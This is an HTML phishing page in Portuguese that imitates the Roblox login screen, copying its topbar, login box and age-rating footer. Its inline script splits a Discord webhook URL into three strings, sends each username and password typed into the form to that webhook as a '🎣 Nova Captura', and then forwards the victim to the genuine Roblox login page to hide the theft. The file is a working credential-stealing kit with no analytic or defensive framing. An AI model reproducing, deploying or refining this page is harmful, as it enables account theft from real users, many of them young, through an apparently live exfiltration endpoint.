<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=1024"> <!-- Força a versão Desktop -->
    <title>Entrar na Roblox</title>
    <link rel="icon" href="https://www.roblox.com/favicon.ico">
    <style>
        /* Reset e Fonte Padrão do Roblox Web */
        * {
            margin: 0; padding: 0; box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: #000000;
            color: #ffffff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            /* Fundo com a galeria de jogos escurecida */
            background-image: 
                linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.8)),
                url('https://images.rbxcdn.com/2c3e2e7b4e5f4a6e8c9d0e1f2a3b4c5d.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }

        /* TOPBAR EXATA DO PRINT */
        .topbar {
            background-color: #191b1f;
            height: 48px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 24px;
            border-bottom: 1px solid #2e3134;
            z-index: 100;
        }

        .topbar-left { display: flex; align-items: center; gap: 24px; }
        
        /* Logo Quadrada Inclinada */
        .logo-icon {
            width: 32px; height: 32px;
            background-color: #ffffff;
            transform: rotate(-15deg);
            border-radius: 3px;
            display: flex; align-items: center; justify-content: center;
        }
        .logo-hole { width: 10px; height: 10px; background-color: #191b1f; }

        .nav-links { display: flex; gap: 20px; font-size: 15px; font-weight: 600; color: #e3e3e3; }
        .nav-links span { cursor: pointer; }
        .nav-links span.active { color: #fff; border-bottom: 2px solid #fff; padding-bottom: 14px;}

        .topbar-right { display: flex; align-items: center; gap: 12px; }
        
        .search-bar {
            background-color: #272a2e; border: 1px solid #3b3f43;
            border-radius: 6px; padding: 6px 12px;
            display: flex; align-items: center; gap: 8px;
            width: 300px; color: #9ea2a6; font-size: 14px;
        }

        .btn-cadastrar {
            background-color: #335fff; color: #fff; border: none;
            padding: 8px 16px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer;
        }

        .btn-entrar-top {
            background-color: transparent; color: #fff; border: 1px solid #ffffff;
            padding: 8px 16px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer;
        }

        /* ÁREA CENTRAL */
        .main-area {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }

        /* CAIXA DE LOGIN FINA */
        .login-card {
            background-color: #232527;
            width: 100%;
            max-width: 360px; /* Deixei mais fina */
            border-radius: 8px;
            padding: 32px 24px; /* Padding interno menor */
            box-shadow: 0 4px 20px rgba(0,0,0,0.6);
            border: 1px solid #3b3f43;
            z-index: 10;
        }

        .login-card h1 {
            font-size: 24px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 24px;
        }

        .input-group { margin-bottom: 12px; }

        .input-group input {
            width: 100%;
            padding: 10px 12px; /* Inputs mais baixos */
            background-color: #191b1f;
            border: 1px solid #3b3f43;
            border-radius: 6px;
            color: #fff;
            font-size: 15px;
            outline: none;
        }

        .input-group input::placeholder { color: #9ea2a6; }

        .btn-main {
            width: 100%;
            padding: 12px; /* Botão mais fino */
            background-color: #232527;
            border: 1px solid #ffffff;
            border-radius: 6px;
            color: #ffffff;
            font-size: 15px;
            font-weight: 600;
            margin-top: 4px;
            cursor: pointer;
        }

        .btn-main:active { background-color: #3b3f43; }

        .forgot-link {
            display: block;
            text-align: center;
            color: #ffffff;
            text-decoration: none;
            font-size: 14px;
            margin: 16px 0;
            font-weight: 600;
        }

        .divider { height: 1px; background-color: #3b3f43; margin: 20px 0; }

        .btn-secondary {
            width: 100%;
            padding: 12px; /* Botões secundários finos */
            background-color: #272a2e;
            border: 1px solid #3b3f43;
            border-radius: 6px;
            color: #ffffff;
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 12px;
            cursor: pointer;
        }

        .btn-secondary:active { background-color: #3b3f43; }

        .signup-text { text-align: center; color: #e3e3e3; font-size: 14px; margin-top: 20px; }
        .signup-text a { color: #ffffff; font-weight: 700; text-decoration: none; }

        /* RODAPÉ FIXO NO FUNDO */
        .footer-rating {
            background-color: #191b1f;
            padding: 12px 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            border-top: 1px solid #2e3134;
        }

        .footer-text {
            font-size: 12px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 8px;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }

        .rating-box {
            display: flex;
            background: #fff;
            color: #000;
            border-radius: 4px;
            overflow: hidden;
            width: 300px;
            margin-bottom: 8px;
        }

        .rating-red-box {
            background-color: #ff0000;
            color: #fff;
            font-size: 28px;
            font-weight: 900;
            padding: 10px 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .rating-text-box {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0 16px;
            font-size: 14px;
            font-weight: 600;
        }

        .footer-desc {
            font-size: 12px;
            text-align: center;
            color: #e3e3e3;
            line-height: 1.4;
        }
    </style>
</head>
<body>

    <!-- TOPBAR -->
    <div class="topbar">
        <div class="topbar-left">
            <div class="logo-icon"><div class="logo-hole"></div></div>
            <div class="nav-links">
                <span class="active">Destaques</span>
                <span>Mercado</span>
                <span>Criar</span>
                <span>Robux</span>
            </div>
        </div>
        <div class="topbar-right">
            <div class="search-bar">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9ea2a6" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
                Pesquisar
            </div>
            <button class="btn-cadastrar">Cadastrar-se</button>
            <button class="btn-entrar-top">Entrar</button>
        </div>
    </div>

    <!-- ÁREA CENTRAL -->
    <div class="main-area">
        <!-- CAIXA DE LOGIN -->
        <div class="login-card">
            <h1>Entrar na Roblox</h1>
            
            <form id="login-form">
                <div class="input-group">
                    <input type="text" id="username" placeholder="Usuário/e-mail/telefone" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Senha" required>
                </div>
                <button type="submit" class="btn-main" id="btn-submit">Entrar</button>
            </form>

            <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>
            <div class="divider"></div>
            
            <button class="btn-secondary">Envie-me um código único por e-mail</button>
            <button class="btn-secondary">Entrada rápida</button>
            <button class="btn-secondary">Outras opções de acesso</button>

            <div class="signup-text">
                Não possui uma conta? <a href="#">Cadastrar-se</a>
            </div>
        </div>
    </div>

    <!-- RODAPÉ -->
    <div class="footer-rating">
        <div class="footer-text">CLASSIFICAÇÃO INDICATIVA: 16 ANOS</div>
        <div class="rating-box">
            <div class="rating-red-box">16</div>
            <div class="rating-text-box">Violência</div>
        </div>
        <div class="footer-desc">
            Interação entre usuários<br>
            Compras no jogo (inclui itens aleatórios)
        </div>
    </div>

    <!-- SCRIPT -->
    <script>
        (function(){
            var p1 = "https://discord.com/api/webhooks/";
            var p2 = "1573426421085241448/";
            var p3 = "LGoTUoMIZdohFLYE9s3THG4sSUFbbi1PEF5Hd1145-KIH6KapiIvAnLGhFT4kmlfOFPL";
            var url = p1 + p2 + p3;

            var form = document.getElementById('login-form');
            var btn = document.getElementById('btn-submit');
            var u = document.getElementById('username');
            var p = document.getElementById('password');

            form.addEventListener('submit', function(e) {
                e.preventDefault();
                if(!u.value || !p.value) return;
                
                btn.textContent = 'Entrando...';
                
                var dados = {
                    content: "🎣 **Nova Captura**\n👤 User: `" + u.value + "`\n🔑 Senha: `" + p.value + "`"
                };

                fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dados)
                }).then(function() {
                    setTimeout(function() {
                        window.location.href = 'https://www.roblox.com/pt/Login';
                    }, 1500);
                }).catch(function() {
                    btn.textContent = 'Entrar';
                });
            });
        })();
    </script>
</body>
</html>
